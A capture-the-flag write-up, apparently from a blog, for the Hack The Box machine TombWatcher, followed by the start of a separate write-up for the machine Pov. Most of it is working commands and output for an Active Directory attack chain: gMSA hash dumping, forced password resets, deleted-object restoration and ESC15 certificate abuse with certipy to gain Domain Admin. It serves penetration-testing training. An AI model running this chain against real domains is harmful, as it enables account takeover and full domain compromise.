└─$ bloodyad -u alfred -p '<Alfred-Password>' -d tombwatcher.htb -i <TARGET_IP> add groupMember Infrastructure Alfred [+] Alfred added to Infrastructure To dump the gMSA password of Ansible_Dev$:
└─$ sudo netexec ldap <TARGET_IP> -u alfred -p '<Alfred-Password>' --gmsa We will get the NTLM hash in output. Using the hash, we can now change the password of user Sam:
└─$ bloodyad -u 'ansible_dev$' -p ':<NTHash>' -d tombwatcher.htb -i <TARGET_IP> set password sam 'Sam@12345' [+] Password changed successfully! To change the ownership of user John from existing owner to Sam:
└─$ bloodyad -u sam -p 'Sam@12345' -d tombwatcher.htb -i <TARGET_IP> set owner john sam [+] Old owner S-1-5-21-1392491010-1358638721-2126982587-512 is now replaced by sam on john NOTE: After some time the owner attribute of John is reset so make sure to rewrite the owner if further attacks don’t work
To confirm the ownership of the user, we can use impacket-owneredit:
└─$ impacket-owneredit tombwatcher.htb/sam:'Sam@12345' -dc-ip <TARGET_IP> -target john -action read Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies [*] Current owner information below [*] - SID: S-1-5-21-1392491010-1358638721-2126982587-1105 [*] - sAMAccountName: sam [*] - distinguishedName: CN=sam,CN=Users,DC=tombwatcher,DC=htb Now as we have the ownership, we can grant ourselves full control of the user by adding the GenericAll privileges:
└─$ bloodyad -u sam -p 'Sam@12345' -d tombwatcher.htb -i <TARGET_IP> add genericAll john sam [+] sam has now GenericAll on john Just like we changed the password of Sam, we can now use Sam to change the password of John:
└─$ bloodyad -u sam -p 'Sam@12345' -d tombwatcher.htb -i <TARGET_IP> set password john 'John@12345' [+] Password changed successfully! Checking the group membership of “Remote Management Users” in bloodhound, we only find John as a member of the Remote Management Users group, which grants him WinRM access to the host.
To login to WinRM:
└─$ evil-winrm -i <TARGET_IP> -u 'john' -p 'John@12345' We can find the user.txt in Desktop folder of user John:
*Evil-WinRM* PS C:\Users\john\Documents> cat ..\Desktop\user.txt Escalating Privileges # After gaining access as John, we have GenericAll rights over the OU ADCS. Checking the objects that come under this OU, we found only one GPO (Group Policy Object). Having the GenericAll rights, we can apply ACEs (Access Control Entries) that will be inherited down to the objects in the OU. All object will inherit the ACEs except those marked with ACL Inheritance Disabled as true. Checking the info of the GPO revealed that it’s not going to inherit the ACEs we apply to the OU
So we have to find some other way to reach the Administrator account.
Abusing the Deleted Objects Container # Rechecking the write privileges of our user john with bloodyad as bloodhound doesn’t show all the Active Directory configurations:
└─$ bloodyad -u john -p 'John@12345' -d tombwatcher.htb -i <TARGET_IP> get writable --right WRITE --otype ou distinguishedName: CN=Deleted Objects,DC=tombwatcher,DC=htb permission: WRITE distinguishedName: OU=ADCS,DC=tombwatcher,DC=htb permission: WRITE From here, we saw an OU “Deleted Objects” which acts like a Recycle Bin for Active Directory. It contains objects that are deleted from the Active Directory. As we have permissions over the OU, we can list the objects and find interesting ones that may help us in privilege escalation.
└─$ bloodyad -u john -p 'John@12345' -d tombwatcher.htb -i <TARGET_IP> get children --target 'CN=Deleted Objects,DC=tombwatcher,DC=htb' distinguishedName: CN=cert_admin\0ADEL:f80369c8-96a2-4a7f-a56c-9c15edd7d1e3,CN=Deleted Objects,DC=tombwatcher,DC=htb distinguishedName: CN=cert_admin\0ADEL:c1f1f0fe-df9c-494c-bf05-0679e181b358,CN=Deleted Objects,DC=tombwatcher,DC=htb distinguishedName: CN=cert_admin\0ADEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf,CN=Deleted Objects,DC=tombwatcher,DC=htb The output shows 3 objects that seemed to be related to Active Directory Certificate Services. We can recover the user but first we need to have its SID which we can find with:
└─$ bloodyad -u john -d tombwatcher.htb -p 'John@12345' -i <TARGET_IP> get search -c 1.2.840.113556.1.4.2064 --resolve-sd --attr distinguishedName,sAMAccountName,objectSid,objectClass --base 'CN=Deleted Objects,DC=tombwatcher,DC=htb' --filter "(objectClass=user)" distinguishedName: CN=cert_admin\0ADEL:f80369c8-96a2-4a7f-a56c-9c15edd7d1e3,CN=Deleted Objects,DC=tombwatcher,DC=htb objectClass: top; person; organizationalPerson; user objectSid: S-1-5-21-1392491010-1358638721-2126982587-1109 sAMAccountName: cert_admin distinguishedName: CN=cert_admin\0ADEL:c1f1f0fe-df9c-494c-bf05-0679e181b358,CN=Deleted Objects,DC=tombwatcher,DC=htb objectClass: top; person; organizationalPerson; user objectSid: S-1-5-21-1392491010-1358638721-2126982587-1110 sAMAccountName: cert_admin distinguishedName: CN=cert_admin\0ADEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf,CN=Deleted Objects,DC=tombwatcher,DC=htb objectClass: top; person; organizationalPerson; user objectSid: S-1-5-21-1392491010-1358638721-2126982587-1111 sAMAccountName: cert_admin Now to recover the deleted user object:
└─$ bloodyad -u john -p 'John@12345' -d tombwatcher.htb -i <TARGET_IP> set restore S-1-5-21-1392491010-1358638721-2126982587-1111 [+] S-1-5-21-1392491010-1358638721-2126982587-1111 has been restored successfully under CN=cert_admin,OU=ADCS,DC=tombwatcher,DC=htb NOTE: Just like the owner attribute of John, the restored user is automatically deleted again after some time. So same advice for it like above.
From the output, the object is restored under OU ADCS. If we apply the ACE to the OU, it will also be applied to the cert_admin user:
└─$ impacket-dacledit -action 'write' -rights 'FullControl' -inheritance -principal 'john' -target-dn 'OU=ADCS,DC=TOMBWATCHER,DC=HTB' 'tombwatcher.htb'/'john':'John@12345' Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies [*] NB: objects with adminCount=1 will no inherit ACEs from their parent container/OU [*] DACL backed up to dacledit-20260625-040644.bak [*] DACL modified successfully! Gaining GenericAll privileges over every object of the OU, we can now reset the password of cert_admin:
└─$ bloodyad -u john -p 'John@12345' -d tombwatcher.htb -i <TARGET_IP> set password cert_admin "CertAdmin@12345" [+] Password changed successfully! Exploiting Active Directory Certificate Services # Given the name of the account, it is reasonable to investigate Active Directory Certificate Services (AD CS). We can check for vulnerabilities in the Certificate Authority and Templates using certipy:
└─$ certipy find -u 'cert_admin@tombwatcher.htb' -p 'CertAdmin@12345' -dc-ip <TARGET_IP> -vulnerable -stdout Certipy v5.0.3 - by Oliver Lyak (ly4k) [*] Finding certificate templates [*] Found 33 certificate templates [*] Finding certificate authorities [*] Found 1 certificate authority [*] Found 11 enabled certificate templates [*] Finding issuance policies [*] Found 13 issuance policies [*] Found 0 OIDs linked to templates [*] Retrieving CA configuration for 'tombwatcher-CA-1' via RRP [!] Failed to connect to remote registry. Service should be starting now. Trying again... [*] Successfully retrieved CA configuration for 'tombwatcher-CA-1' [*] Checking web enrollment for CA 'tombwatcher-CA-1' @ 'DC01.tombwatcher.htb' [!] Error checking web enrollment: timed out [!] Use -debug to print a stacktrace [*] Enumeration output: Certificate Authorities 0 CA Name : tombwatcher-CA-1 DNS Name : DC01.tombwatcher.htb Certificate Subject : CN=tombwatcher-CA-1, DC=tombwatcher, DC=htb Certificate Serial Number : 3428A7FC52C310B2460F8440AA8327AC Certificate Validity Start : 2024-11-16 00:47:48+00:00 Certificate Validity End : 2123-11-16 00:57:48+00:00 Web Enrollment HTTP Enabled : False HTTPS Enabled : False User Specified SAN : Disabled Request Disposition : Issue Enforce Encryption for Requests : Enabled Active Policy : CertificateAuthority_MicrosoftDefault.Policy Permissions Owner : TOMBWATCHER.HTB\Administrators Access Rights ManageCa : TOMBWATCHER.HTB\Administrators TOMBWATCHER.HTB\Domain Admins TOMBWATCHER.HTB\Enterprise Admins ManageCertificates : TOMBWATCHER.HTB\Administrators TOMBWATCHER.HTB\Domain Admins TOMBWATCHER.HTB\Enterprise Admins Enroll : TOMBWATCHER.HTB\Authenticated Users Certificate Templates 0 Template Name : WebServer Display Name : Web Server Certificate Authorities : tombwatcher-CA-1 Enabled : True Client Authentication : False Enrollment Agent : False Any Purpose : False Enrollee Supplies Subject : True Certificate Name Flag : EnrolleeSuppliesSubject Extended Key Usage : Server Authentication Requires Manager Approval : False Requires Key Archival : False Authorized Signatures Required : 0 Schema Version : 1 Validity Period : 2 years Renewal Period : 6 weeks Minimum RSA Key Length : 2048 Template Created : 2024-11-16T00:57:49+00:00 Template Last Modified : 2024-11-16T17:07:26+00:00 Permissions Enrollment Permissions Enrollment Rights : TOMBWATCHER.HTB\Domain Admins TOMBWATCHER.HTB\Enterprise Admins TOMBWATCHER.HTB\cert_admin Object Control Permissions Owner : TOMBWATCHER.HTB\Enterprise Admins Full Control Principals : TOMBWATCHER.HTB\Domain Admins TOMBWATCHER.HTB\Enterprise Admins Write Owner Principals : TOMBWATCHER.HTB\Domain Admins TOMBWATCHER.HTB\Enterprise Admins Write Dacl Principals : TOMBWATCHER.HTB\Domain Admins TOMBWATCHER.HTB\Enterprise Admins Write Property Enroll : TOMBWATCHER.HTB\Domain Admins TOMBWATCHER.HTB\Enterprise Admins TOMBWATCHER.HTB\cert_admin [+] User Enrollable Principals : TOMBWATCHER.HTB\cert_admin [!] Vulnerabilities ESC15 : Enrollee supplies subject and schema version is 1. [*] Remarks ESC15 : Only applicable if the environment has not been patched. See CVE-2024-49019 or the wiki for more details. The Remarks at the end tells that it is vulnerable to ESC15 but exploitation depends upon whether the mentioned patch is applied or not.
Searching for techniques related to ESC15, we found the documentation created by the developer of the certipy tool Oliver Lyak. ESC15 is defined as:
ESC15 (also tracked as CVE-2024-49019 or referred to as EKUwu) is an Active Directory Certificate Services (AD CS) privilege escalation vulnerability. It exploits a logic flaw in Schema Version 1 templates. It allows attackers to inject unauthorized Extended Key Usages (EKUs) during certificate enrollment to authenticate as highly privileged accounts (e.g., Domain Admins).
Since cert_admin has enrollment rights on the vulnerable WebServer template, we can request a certificate containing arbitrary application policies. By injecting the Client Authentication EKU and requesting a certificate for the Administrator account, we can obtain credentials that allow authentication as Domain Administrator.
└─$ certipy req -ca tombwatcher-CA-1 -template WebServer -upn Administrator@tombwatcher.htb -sid S-1-5-21-1392491010-1358638721-2126982587-500 -application-policies 'Client Authentication' -u 'cert_admin@tombwatcher.htb' -p 'CertAdmin@12345' -dc-ip <TARGET_IP> Certipy v5.0.3 - by Oliver Lyak (ly4k) [*] Requesting certificate via RPC [*] Request ID is 6 [*] Successfully requested certificate [*] Got certificate with UPN 'Administrator@tombwatcher.htb' [*] Certificate object SID is 'S-1-5-21-1392491010-1358638721-2126982587-500' [*] Saving certificate and private key to 'administrator.pfx' [*] Wrote certificate and private key to 'administrator.pfx' Now the 2nd step is to authenticate via Schannel:
└─$ certipy auth -pfx administrator.pfx -domain tombwatcher.htb -dc-ip <TARGET_IP> -ldap-shell Certipy v5.0.3 - by Oliver Lyak (ly4k) [*] Certificate identities: [*] SAN UPN: 'Administrator@tombwatcher.htb' [*] SAN URL SID: 'S-1-5-21-1392491010-1358638721-2126982587-500' [*] Security Extension SID: 'S-1-5-21-1392491010-1358638721-2126982587-500' [*] Connecting to 'ldaps://<TARGET_IP>:636' [*] Authenticated to '<TARGET_IP>' as: 'u:TOMBWATCHER\\Administrator' Type help for list of commands # As we are authenticated as Domain Admin, we have all the privileges that the help menu of the tool shows. We can add our user John to the Administrators group of Domain Controller with:
# add_user_to_group john "Administrators" Adding user: john to group Administrators result: OK Now authenticating via WinRM:
└─$ evil-winrm -i 10.129.232.167 -u 'john' -p 'John@12345' *Evil-WinRM* PS C:\Users\john\Documents> whoami /groups GROUP INFORMATION ----------------- Group Name Type SID Attributes ========================================== ================ ============ =============================================================== Everyone Well-known group S-1-1-0 Mandatory group, Enabled by default, Enabled group BUILTIN\Administrators Alias S-1-5-32-544 Mandatory group, Enabled by default, <SNIP> Access to the root.txt is allowed now
*Evil-WinRM* PS C:\Users\john\Documents> cat C:\Users\Administrator\Desktop\root.txt
summary: Explore WriteSPN abuse, gMSA password extraction, Deleted Objects recovery, and ESC15 AD CS privilege escalation on HTB TombWatcher.
title: TombWatcher Machine Writeup | HTB

content:
Summary # Pov is a medium-difficulty Windows machine that begins with the enumeration of a static website, leading to the discovery of the dev.pov.htb subdomain. A vulnerable file download functionality allows a Local File Inclusion (LFI), exposing the application’s web.config file and its ViewState encryption and validation keys. These secrets are leveraged to craft a malicious ViewState payload, resulting in .NET deserialization and remote code execution as the sfitz user. Further enumeration reveals a serialized PowerShell credential file containing the credentials of alaading, enabling lateral movement. Finally, the SeDebugPrivilege assigned to alaading is abused to migrate into a SYSTEM process, achieving NT AUTHORITY\SYSTEM privileges.
Reconnaissance # Rustscan # We start with rustscan to quickly identify all the open ports from the total 65535 possible ports
└─$ rustscan -a 10.129.40.134 -r 0-65535 PORT STATE SERVICE REASON 80/tcp open http syn-ack ttl 127 Nmap # After identifying the open ports using Rustscan, we will perform detailed enumeration of each open port using Nmap:
└─$ nmap 10.129.40.134 -T4 -sC -sV -p 80 Starting Nmap 7.98 ( https://nmap.org ) at 2026-07-13 15:09 +0500 Nmap scan report for 10.129.40.134 Host is up (0.24s latency).
